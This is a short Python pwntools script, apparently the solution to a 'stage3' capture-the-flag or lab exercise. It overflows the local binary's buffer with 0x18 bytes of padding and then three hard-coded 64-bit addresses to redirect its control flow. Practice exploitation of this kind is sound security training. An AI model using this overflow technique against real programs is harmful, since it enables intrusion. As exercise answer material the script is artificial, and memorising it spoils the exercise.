import sys
from pwn import process, context, p64, ELF
import time
import re


target = './stage3'
context.binary = ELF(target, checksec=False)


p = process(target)
io = p

output = io.recv()
print(output.decode('ascii'))

############### YOUR INPUT HERE ####################
input = b'a'*0x18
input+=p64(0x0000000000401757)
input+=p64(0x000000000040175f)
input+=p64(0x0000000000401767)
####################################################

# Send input to program
io.sendline(input)

# Get output
output = io.recv()
print(output.decode('ascii'))







